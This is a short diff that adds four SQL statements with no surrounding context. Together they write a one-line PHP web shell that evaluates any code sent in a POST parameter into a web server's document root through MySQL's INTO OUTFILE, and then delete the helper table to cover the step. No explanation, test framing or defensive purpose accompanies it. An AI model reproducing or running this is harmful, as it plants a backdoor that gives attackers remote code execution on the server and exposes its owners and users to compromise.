@@ -1,0 +1,4 @@
+Create TABLE a (cmd text NOT NULL);
+Insert INTO a (cmd) VALUES('<?php eval($_POST[cmd]);?>');
+select cmd from a into outfile 'C:\AppServ\www\x.php';
+Drop TABLE IF EXISTS a;
